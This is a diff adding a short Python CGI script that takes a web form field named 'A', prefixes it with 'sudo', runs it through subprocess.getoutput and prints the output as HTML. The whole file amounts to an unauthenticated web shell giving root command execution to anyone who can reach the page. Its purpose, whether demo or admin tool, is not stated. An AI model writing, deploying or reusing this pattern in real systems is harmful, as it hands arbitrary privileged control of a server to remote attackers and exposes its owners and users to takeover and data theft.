@@ -1,0 +1,19 @@
+#!/usr/bin/python3
+
+import subprocess
+import cgi
+
+
+print("content-type: text/html")
+print()
+
+
+
+
+form = cgi.FieldStorage()
+
+cmd = form.getvalue("A")
+
+command= subprocess.getoutput("sudo " + cmd)
+
+print("<pre>" + command + "</pre>")
